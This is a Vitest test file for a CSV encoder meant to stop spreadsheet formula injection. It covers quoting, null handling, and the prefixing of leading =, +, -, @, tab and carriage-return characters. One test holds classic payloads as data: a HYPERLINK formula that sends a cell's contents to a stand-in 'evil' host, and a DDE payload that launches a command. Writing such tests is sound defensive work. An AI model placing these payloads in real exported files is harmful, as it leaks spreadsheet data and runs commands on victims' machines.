import { describe, expect, it } from 'vitest';
import { csvCell, csvRow } from './csv.js';

describe('csvCell — formula-injection-safe CSV encoding', () => {
  it('quotes plain values and escapes embedded quotes', () => {
    expect(csvCell('hello')).toBe('"hello"');
    expect(csvCell('a"b')).toBe('"a""b"');
  });

  it('coerces null / undefined / number to a quoted string', () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
    expect(csvCell(42)).toBe('"42"');
  });

  it('neutralizes a leading formula trigger with a quote prefix', () => {
    for (const lead of ['=', '+', '-', '@']) {
      expect(csvCell(`${lead}cmd`)).toBe(`"'${lead}cmd"`);
    }
  });

  it('neutralizes a leading tab / carriage-return trigger', () => {
    expect(csvCell('\t=1')).toBe(`"'\t=1"`);
    expect(csvCell('\r=1')).toBe(`"'\r=1"`);
  });

  it('neutralizes the classic HYPERLINK / DDE payloads', () => {
    const hyperlink = '=HYPERLINK("http://evil/?"&A1,"refund")';
    expect(csvCell(hyperlink)).toBe(`"'${hyperlink.replace(/"/g, '""')}"`);

    const dde = "=cmd|'/c calc'!A1";
    expect(csvCell(dde)).toBe(`"'${dde}"`);
  });

  it('does NOT neutralize a non-leading operator', () => {
    expect(csvCell('1+1')).toBe('"1+1"');
    expect(csvCell('a-b')).toBe('"a-b"');
  });

  it('csvRow encodes every cell and never shifts columns on embedded commas', () => {
    expect(csvRow(['a,b', 'c', null])).toBe('"a,b","c",""');
    expect(csvRow(['=x', 'y'])).toBe(`"'=x","y"`);
  });
});
